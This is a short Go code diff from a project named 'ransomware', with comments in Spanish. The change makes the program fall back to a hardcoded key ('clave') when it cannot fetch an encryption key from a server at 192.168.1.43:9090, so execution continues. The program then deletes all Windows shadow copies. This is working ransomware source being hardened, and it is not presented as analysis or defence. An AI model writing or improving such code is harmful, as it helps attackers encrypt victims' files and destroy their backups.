@@ -6,13 +6,13 @@ import (
 	"ransomware/ransomUtils"
 )
 
-//const key = "clave"
+const defaultKey = "clave"
 
 func main() {
 	key, err := ransomUtils.ObtenerClave("192.168.1.43:9090")
 	if err != nil {
 		fmt.Println("Error al obtener la palabra:", err)
-		return
+		key= defaultKey
 	}
 	resultInfo, errShadowCopies := comunUtils.DeleteAllShadowCopies()
 	if errShadowCopies != nil {
